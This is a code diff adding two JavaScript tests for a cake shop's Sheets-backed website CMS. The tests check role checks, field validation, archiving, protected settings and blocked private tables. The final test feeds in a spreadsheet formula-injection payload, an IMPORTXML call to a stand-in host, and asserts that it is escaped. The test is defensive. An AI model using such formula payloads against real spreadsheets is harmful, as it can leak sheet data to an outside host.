@@ -608,3 +608,46 @@ test('staff password reset and disable revoke sessions without leaking password 
   assert.equal(h.post({action:'staff_account_set_active',id_token:ADMIN_TOKEN,username:'kitchen02',active:true}).updated,true);
   assert.equal(h.post({action:'staff_password_login',username:'kitchen02',password:'NewKitchenStrongPass20!'}).ok,true);
 });
+
+
+test('website CMS manages FAQ rows in private Sheets with create/edit/archive and strict role checks',()=>{
+  const h=harness({singleFile:true});
+  h.tables.faqs=[['id','question','answer','sort_order','is_active']];
+  assert.equal(h.post({action:'staff_cms_list',id_token:RIDER_TOKEN,table:'faqs'}).code,'forbidden');
+  assert.equal(h.post({action:'staff_cms_list',id_token:INTRUDER_TOKEN,table:'faqs'}).code,'forbidden');
+  assert.equal(h.post({action:'staff_cms_list',id_token:ADMIN_TOKEN,table:'orders'}).code,'forbidden');
+  const bad=h.post({action:'staff_cms_create',id_token:ADMIN_TOKEN,table:'faqs',values:{question:'Q',answer:'A',is_active:true,unknown_field:'unsafe'}});
+  assert.equal(bad.code,'invalid_field');
+  const created=h.post({action:'staff_cms_create',id_token:ADMIN_TOKEN,table:'faqs',values:{question:'Do you deliver?',answer:'Yes, in Tangail.',sort_order:1,is_active:true}});
+  assert.equal(created.operation,'created',JSON.stringify(created));
+  assert.equal(h.records('faqs').length,1);
+  const id=String(h.records('faqs')[0].id);
+  assert.ok(id.startsWith('cms_'));
+  const snap=h.post({action:'staff_cms_list',id_token:ADMIN_TOKEN,table:'faqs'});
+  assert.equal(snap.rows[0].question,'Do you deliver?');
+  assert.equal(snap.can_delete,true);
+  assert.equal(h.post({action:'staff_cms_update',id_token:ADMIN_TOKEN,table:'faqs',record_id:id,values:{answer:'Free delivery may be available.'}}).operation,'updated');
+  assert.equal(h.records('faqs')[0].answer,'Free delivery may be available.');
+  assert.equal(h.post({action:'staff_cms_delete',id_token:RIDER_TOKEN,table:'faqs',record_id:id,values:{}}).code,'forbidden');
+  assert.equal(h.post({action:'staff_cms_delete',id_token:ADMIN_TOKEN,table:'faqs',record_id:id,values:{}}).operation,'archived');
+  assert.equal(h.records('faqs')[0].is_active,false);
+  assert.equal(h.records('faqs').length,1);
+  assert.equal(h.records('orders').length,0);
+});
+test('website CMS safely edits approved shop settings and refuses private tables and formulas',()=>{
+  const h=harness({singleFile:true});
+  assert.equal(h.post({action:'staff_cms_update',id_token:ADMIN_TOKEN,table:'settings',record_id:'shop_name',values:{value:'Aurora Cake House'}}).operation,'updated');
+  const rows=h.records('settings');
+  assert.equal(rows[0].value,'Aurora Cake House');
+  assert.equal(h.post({action:'staff_cms_update',id_token:ADMIN_TOKEN,table:'settings',record_id:'secret_key',values:{value:'x'}}).code,'forbidden');
+  assert.equal(h.post({action:'staff_cms_delete',id_token:ADMIN_TOKEN,table:'settings',record_id:'shop_name',values:{}}).code,'protected');
+  assert.equal(h.post({action:'staff_cms_list',id_token:ADMIN_TOKEN,table:'customer_accounts'}).code,'forbidden');
+  assert.equal(h.post({action:'staff_cms_list',id_token:ADMIN_TOKEN,table:'auth_sessions'}).code,'forbidden');
+  assert.equal(h.post({action:'staff_cms_list',id_token:ADMIN_TOKEN,table:'orders'}).code,'forbidden');
+  h.tables.faqs=[['id','question','answer','sort_order','is_active']];
+  const saved=h.post({action:'staff_cms_create',id_token:ADMIN_TOKEN,table:'faqs',values:{
+    question:'Can you customize cakes?',answer:'=IMPORTXML("https://bad.example","//")',sort_order:0,is_active:true,
+  }});
+  assert.equal(saved.operation,'created');
+  assert.ok(String(h.records('faqs')[0].answer).startsWith("'="));
+});
